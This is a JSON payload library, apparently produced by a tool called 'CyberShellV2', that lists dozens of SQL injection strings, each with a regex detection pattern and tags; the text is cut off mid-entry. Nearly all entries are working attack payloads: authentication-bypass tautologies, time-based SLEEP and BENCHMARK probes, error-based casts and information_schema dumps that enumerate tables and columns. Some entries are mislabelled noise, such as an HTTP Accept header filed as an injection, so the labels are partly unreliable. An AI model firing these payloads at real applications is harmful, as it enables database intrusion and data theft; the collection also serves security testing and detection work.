{
  "description": "Custom payloads mined from user-provided files",
  "author": "CyberShellV2",
  "version": "1.0.0",
  "generated_at": "2025-08-24T04:06:07.361175Z",
  "payloads": [
    {
      "category": "SQLI",
      "name": "SQLI \" OR \"\" = \" [e4ce618e]",
      "payload": "\" OR \"\" = \"",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\"\\ OR\\ \"\"\\ =\\ \"",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI \" OR 1 = 1 -- - [c895af66]",
      "payload": "\" OR 1 = 1 -- -",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\"\\ OR\\ 1\\ =\\ 1\\ \\-\\-\\ \\-",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI \"'/**/AND/**/'1'='1'--\", [e2e36f54]",
      "payload": "\"'/**/AND/**/'1'='1'--\",",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\"'/\\*\\*/AND/\\*\\*/'1'='1'\\-\\-\",",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI \"'/**/AND/**/'1'='2'--\", [a066bcda]",
      "payload": "\"'/**/AND/**/'1'='2'--\",",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\"'/\\*\\*/AND/\\*\\*/'1'='2'\\-\\-\",",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI \"'/**/AND/**/1=1--\", [b3e99d72]",
      "payload": "\"'/**/AND/**/1=1--\",",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\"'/\\*\\*/AND/\\*\\*/1=1\\-\\-\",",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI \"'/**/AND/**/1=1/*\", [6148ce78]",
      "payload": "\"'/**/AND/**/1=1/*\",",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\"'/\\*\\*/AND/\\*\\*/1=1/\\*\",",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI \"'/**/AND/**/1=2--\", [46e322e5]",
      "payload": "\"'/**/AND/**/1=2--\",",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\"'/\\*\\*/AND/\\*\\*/1=2\\-\\-\",",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI \"'/**/AND/**/1=2/*\", [8f59f956]",
      "payload": "\"'/**/AND/**/1=2/*\",",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\"'/\\*\\*/AND/\\*\\*/1=2/\\*\",",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI \"'/**/AND/**/EXISTS(SELECT/**/1)--\", [5e279b48]",
      "payload": "\"'/**/AND/**/EXISTS(SELECT/**/1)--\",",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\"'/\\*\\*/AND/\\*\\*/EXISTS\\(SELECT/\\*\\*/1\\)\\-\\-\",",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI \"'/**/AND/**/SUBSTRING(@@version,1,1)='5 [5a1bc20f]",
      "payload": "\"'/**/AND/**/SUBSTRING(@@version,1,1)='5'--\",",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\"'/\\*\\*/AND/\\*\\*/SUBSTRING\\(@@version,1,1\\)='5'\\-\\-\",",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI \"'/**/AND/**/SUBSTRING(@@version,1,1)='8 [3c9cd4e0]",
      "payload": "\"'/**/AND/**/SUBSTRING(@@version,1,1)='8'--\",",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\"'/\\*\\*/AND/\\*\\*/SUBSTRING\\(@@version,1,1\\)='8'\\-\\-\",",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI \"'/**/OR/**/'a'='a'--\", [2894a995]",
      "payload": "\"'/**/OR/**/'a'='a'--\",",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\"'/\\*\\*/OR/\\*\\*/'a'='a'\\-\\-\",",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI \"'/**/OR/**/1=1#\", [0def40cb]",
      "payload": "\"'/**/OR/**/1=1#\",",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\"'/\\*\\*/OR/\\*\\*/1=1\\#\",",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI \"'/**/OR/**/1=1--\", [6c957ca2]",
      "payload": "\"'/**/OR/**/1=1--\",",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\"'/\\*\\*/OR/\\*\\*/1=1\\-\\-\",",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI \"'/**/OR/**/1=1/*\", [97bd4f66]",
      "payload": "\"'/**/OR/**/1=1/*\",",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\"'/\\*\\*/OR/\\*\\*/1=1/\\*\",",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI \"'/**/OR/**/1=1/**/AND/**/'1'='1'--\", [bbdca8f1]",
      "payload": "\"'/**/OR/**/1=1/**/AND/**/'1'='1'--\",",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\"'/\\*\\*/OR/\\*\\*/1=1/\\*\\*/AND/\\*\\*/'1'='1'\\-\\-\",",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI \"'/**/OR/**/1=1/**/AND/**/1=1--\", [d0130fe1]",
      "payload": "\"'/**/OR/**/1=1/**/AND/**/1=1--\",",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\"'/\\*\\*/OR/\\*\\*/1=1/\\*\\*/AND/\\*\\*/1=1\\-\\-\",",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI \"'/**/OR/**/1=1/**/ORDER/**/BY/**/1--\", [6cf82dc3]",
      "payload": "\"'/**/OR/**/1=1/**/ORDER/**/BY/**/1--\",",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\"'/\\*\\*/OR/\\*\\*/1=1/\\*\\*/ORDER/\\*\\*/BY/\\*\\*/1\\-\\-\",",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI \"'/**/OR/**/1=2/*\", [b363602f]",
      "payload": "\"'/**/OR/**/1=2/*\",",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\"'/\\*\\*/OR/\\*\\*/1=2/\\*\",",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI \"'/**/OR/**/EXISTS(SELECT/**/1)--\", [00c05074]",
      "payload": "\"'/**/OR/**/EXISTS(SELECT/**/1)--\",",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\"'/\\*\\*/OR/\\*\\*/EXISTS\\(SELECT/\\*\\*/1\\)\\-\\-\",",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI \"'/**/OR/**/LOWER(database())/**/LIKE/** [a39c0aae]",
      "payload": "\"'/**/OR/**/LOWER(database())/**/LIKE/**/'%test%'--\",",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\"'/\\*\\*/OR/\\*\\*/LOWER\\(database\\(\\)\\)/\\*\\*/LIKE/\\*\\*/'%test%'\\-\\-\",",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI \"'/**/UNION/**/SELECT/**/NULL,NULL--\", [be3868eb]",
      "payload": "\"'/**/UNION/**/SELECT/**/NULL,NULL--\",",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\"'/\\*\\*/UNION/\\*\\*/SELECT/\\*\\*/NULL,NULL\\-\\-\",",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI \"INSERT INTO stages (id,code) VALUES (3, [1fe4c805]",
      "payload": "\"INSERT INTO stages (id,code) VALUES (3, 'UNION SELECT NULL --');\",",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\"INSERT\\ INTO\\ stages\\ \\(id,code\\)\\ VALUES\\ \\(3,\\ 'UNION\\ SELECT\\ NULL\\ \\-\\-'\\);\",",
      "tags": [
        "union"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI \"SELECT SLEEP(2);\", [dfdf4f93]",
      "payload": "\"SELECT SLEEP(2);\",",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\"SELECT\\ SLEEP\\(2\\);\",",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI \"\\\"/**/OR/**/1=1--\", [254fbdc2]",
      "payload": "\"\\\"/**/OR/**/1=1--\",",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\"\\\\\"/\\*\\*/OR/\\*\\*/1=1\\-\\-\",",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI \"\\\"/**/OR/**/1=1/**/AND/**/'a'='a'--\", [32f4d074]",
      "payload": "\"\\\"/**/OR/**/1=1/**/AND/**/'a'='a'--\",",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\"\\\\\"/\\*\\*/OR/\\*\\*/1=1/\\*\\*/AND/\\*\\*/'a'='a'\\-\\-\",",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI # Payload: '||(SELECT 0x59685353 FROM DU [f176174d]",
      "payload": "# Payload: '||(SELECT 0x59685353 FROM DUAL WHERE 7114=7114 AND SLEEP(5))||'",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\#\\ Payload:\\ '\\|\\|\\(SELECT\\ 0x59685353\\ FROM\\ DUAL\\ WHERE\\ 7114=7114\\ AND\\ SLEEP\\(5\\)\\)\\|\\|'",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI %bf' OR 1=1 -- -- [58a5f51f]",
      "payload": "%bf' OR 1=1 -- --",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "%bf'\\ OR\\ 1=1\\ \\-\\-\\ \\-\\-",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ' + cast((SELECT @@version) as int) + ' [53e0782d]",
      "payload": "' + cast((SELECT @@version) as int) + '",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "'\\ \\+\\ cast\\(\\(SELECT\\ @@version\\)\\ as\\ int\\)\\ \\+\\ '",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ' + convert(int,@@version) + ' [afb695dd]",
      "payload": "' + convert(int,@@version) + '",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "'\\ \\+\\ convert\\(int,@@version\\)\\ \\+\\ '",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ' OR '1 [9fb55e65]",
      "payload": "' OR '1",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "'\\ OR\\ '1",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ' OR (SELECT username FROM users WHERE u [1432f131]",
      "payload": "' OR (SELECT username FROM users WHERE username REGEXP '[0-9]') --\tChecking for the presence of digits",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "'\\ OR\\ \\(SELECT\\ username\\ FROM\\ users\\ WHERE\\ username\\ REGEXP\\ '\\[0\\-9\\]'\\)\\ \\-\\-\\\tChecking\\ for\\ the\\ presence\\ of\\ digits",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ' OR (SELECT username FROM users WHERE u [4d4ef8ab]",
      "payload": "' OR (SELECT username FROM users WHERE username REGEXP '^.{8,}$') --\tChecking length",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "'\\ OR\\ \\(SELECT\\ username\\ FROM\\ users\\ WHERE\\ username\\ REGEXP\\ '\\^\\.\\{8,\\}\\$'\\)\\ \\-\\-\\\tChecking\\ length",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ' OR (SELECT username FROM users WHERE u [d3ebdd2b]",
      "payload": "' OR (SELECT username FROM users WHERE username REGEXP '^a[a-z]') --\tChecking for data starting by \"a\"",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "'\\ OR\\ \\(SELECT\\ username\\ FROM\\ users\\ WHERE\\ username\\ REGEXP\\ '\\^a\\[a\\-z\\]'\\)\\ \\-\\-\\\tChecking\\ for\\ data\\ starting\\ by\\ \"a\"",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ' OR 1 -- - [fce01103]",
      "payload": "' OR 1 -- -",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "'\\ OR\\ 1\\ \\-\\-\\ \\-",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ' OR if(1/(length((select('a')))-1)=1,tr [cd7e7db2]",
      "payload": "' OR if(1/(length((select('a')))-1)=1,true,false) OR '\tDivision by zero",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "'\\ OR\\ if\\(1/\\(length\\(\\(select\\('a'\\)\\)\\)\\-1\\)=1,true,false\\)\\ OR\\ '\\\tDivision\\ by\\ zero",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ' and (SELECT count(*) from sysibm.colum [aa4385de]",
      "payload": "' and (SELECT count(*) from sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)>0 and (select ascii(substr(user,1,1)) from sysibm.sysdummy1)=68",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "'\\ and\\ \\(SELECT\\ count\\(\\*\\)\\ from\\ sysibm\\.columns\\ t1,\\ sysibm\\.columns\\ t2,\\ sysibm\\.columns\\ t3\\)>0\\ and\\ \\(select\\ ascii\\(substr\\(user,1,1\\)\\)\\ from\\ sysibm\\.sysdummy1\\)=68",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ' and 1=cast((SELECT column_name FROM in [54970b12]",
      "payload": "' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "'\\ and\\ 1=cast\\(\\(SELECT\\ column_name\\ FROM\\ information_schema\\.columns\\ WHERE\\ table_name='data_table'\\ LIMIT\\ 1\\ OFFSET\\ data_offset\\)\\ as\\ int\\)\\ and\\ '1'='1",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ' and 1=cast((SELECT concat('DATABASE: ' [f6efeb66]",
      "payload": "' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "'\\ and\\ 1=cast\\(\\(SELECT\\ concat\\('DATABASE:\\ ',current_database\\(\\)\\)\\)\\ as\\ int\\)\\ and\\ '1'='1",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ' and 1=cast((SELECT data_column FROM da [4582cab5]",
      "payload": "' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "'\\ and\\ 1=cast\\(\\(SELECT\\ data_column\\ FROM\\ data_table\\ LIMIT\\ 1\\ OFFSET\\ data_offset\\)\\ as\\ int\\)\\ and\\ '1'='1",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ' and 1=cast((SELECT table_name FROM inf [17bc8485]",
      "payload": "' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "'\\ and\\ 1=cast\\(\\(SELECT\\ table_name\\ FROM\\ information_schema\\.tables\\ LIMIT\\ 1\\ OFFSET\\ data_offset\\)\\ as\\ int\\)\\ and\\ '1'='1",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ' and substr(version(),1,10) = 'PostgreS [9f606912]",
      "payload": "' and substr(version(),1,10) = 'PostgreSQL' and '1  -- TRUE",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "'\\ and\\ substr\\(version\\(\\),1,10\\)\\ =\\ 'PostgreSQL'\\ and\\ '1\\ \\ \\-\\-\\ TRUE",
      "tags": [
        "postgres"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI ' and substr(version(),1,10) = 'PostgreX [8b6728a5]",
      "payload": "' and substr(version(),1,10) = 'PostgreXXX' and '1  -- FALSE",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "'\\ and\\ substr\\(version\\(\\),1,10\\)\\ =\\ 'PostgreXXX'\\ and\\ '1\\ \\ \\-\\-\\ FALSE",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI '+(SELECT 1 AND ROW(1,1)>(SELECT COUNT(* [067b1a66]",
      "payload": "'+(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))+'",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "'\\+\\(SELECT\\ 1\\ AND\\ ROW\\(1,1\\)>\\(SELECT\\ COUNT\\(\\*\\),CONCAT\\(CONCAT\\(@@VERSION\\),0X3A,FLOOR\\(RAND\\(\\)\\*2\\)\\)X\\ FROM\\ \\(SELECT\\ 1\\ UNION\\ SELECT\\ 2\\)A\\ GROUP\\ BY\\ X\\ LIMIT\\ 1\\)\\)\\+'",
      "tags": [
        "enumeration",
        "union"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI '+BENCHMARK(3200,SHA1(1))+' [80f853ce]",
      "payload": "'+BENCHMARK(3200,SHA1(1))+'",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "'\\+BENCHMARK\\(3200,SHA1\\(1\\)\\)\\+'",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI '-(select*from(select+sleep(2)+from+dual [9ad1325b]",
      "payload": "'-(select*from(select+sleep(2)+from+dual)a)--+",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "'\\-\\(select\\*from\\(select\\+sleep\\(2\\)\\+from\\+dual\\)a\\)\\-\\-\\+",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI 'Accept': 'text/html,application/xhtml+x [d742d861]",
      "payload": "'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "'Accept':\\ 'text/html,application/xhtml\\+xml,application/xml;q=0\\.9,image/webp,\\*/\\*;q=0\\.8',",
      "tags": [
        "generic"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI (SELECT 1 AND ROW(1,1)>(SELECT COUNT(*), [7ce278f8]",
      "payload": "(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\(SELECT\\ 1\\ AND\\ ROW\\(1,1\\)>\\(SELECT\\ COUNT\\(\\*\\),CONCAT\\(CONCAT\\(@@VERSION\\),0X3A,FLOOR\\(RAND\\(\\)\\*2\\)\\)X\\ FROM\\ \\(SELECT\\ 1\\ UNION\\ SELECT\\ 2\\)A\\ GROUP\\ BY\\ X\\ LIMIT\\ 1\\)\\)",
      "tags": [
        "enumeration",
        "union"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI (SELECT(SLEEP(5)))lurz) AND 'RQzT'='RQzT [5ae5063e]",
      "payload": "(SELECT(SLEEP(5)))lurz) AND 'RQzT'='RQzT",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\(SELECT\\(SLEEP\\(5\\)\\)\\)lurz\\)\\ AND\\ 'RQzT'='RQzT",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI (Select export_set(5,@:=0,(select count( [aeef4f87]",
      "payload": "(Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\(Select\\ export_set\\(5,@:=0,\\(select\\ count\\(\\*\\)from\\(information_schema\\.columns\\)where@:=export_set\\(5,export_set\\(5,@,table_name,0x3c6c693e,2\\),column_name,0xa3a,2\\)\\),@,2\\)\\)",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI (select (@) from (select(@:=0x00),(selec [aa6d2f7f]",
      "payload": "(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\(select\\ \\(@\\)\\ from\\ \\(select\\(@:=0x00\\),\\(select\\ \\(@\\)\\ from\\ \\(information_schema\\.columns\\)\\ where\\ \\(table_schema>=@\\)\\ and\\ \\(@\\)in\\ \\(@:=concat\\(@,0x0D,0x0A,'\\ \\[\\ ',table_schema,'\\ \\]\\ >\\ ',table_name,'\\ >\\ ',column_name,0x7C\\)\\)\\)\\)a\\)\\#",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI (select(@)from(select(@:=0x00),(select(@ [440ecf56]",
      "payload": "(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\(select\\(@\\)from\\(select\\(@:=0x00\\),\\(select\\(@\\)from\\(information_schema\\.columns\\)where\\(@\\)in\\(@:=concat\\(@,0x3C62723E,table_name,0x3a,column_name\\)\\)\\)\\)a\\)",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI (select(@a)from(select(@a:=0x00),(select [cb7c5f5e]",
      "payload": "(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\(select\\(@a\\)from\\(select\\(@a:=0x00\\),\\(select\\(@a\\)from\\(information_schema\\.columns\\)where\\(table_schema!=0x696e666f726d6174696f6e5f736368656d61\\)and\\(@a\\)in\\(@a:=concat\\(@a,table_name,0x203a3a20,column_name,0x3c62723e\\)\\)\\)\\)a\\)",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI (select(select concat(@:=0xa7,(select co [73ffe691]",
      "payload": "(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@))",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\(select\\(select\\ concat\\(@:=0xa7,\\(select\\ count\\(\\*\\)from\\(information_schema\\.columns\\)where\\(@:=concat\\(@,0x3c6c693e,table_name,0x3a,column_name\\)\\)\\),@\\)\\)",
      "tags": [
        "enumeration"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI +BENCHMARK(40000000,SHA1(1337))+ [6f1078aa]",
      "payload": "+BENCHMARK(40000000,SHA1(1337))+",
      "description": "SQL injection proof-of-concept",
      "confidence_score": 0.7,
      "context": "parameter",
      "detection_pattern": "\\+BENCHMARK\\(40000000,SHA1\\(1337\\)\\)\\+",
      "tags": [
        "time-based"
      ],
      "product": null,
      "version_spec": null,
      "metadata": {}
    },
    {
      "category": "SQLI",
      "name": "SQLI +make_set(6,@:=0x0a,(select(1)from(infor [f6c915b0]",
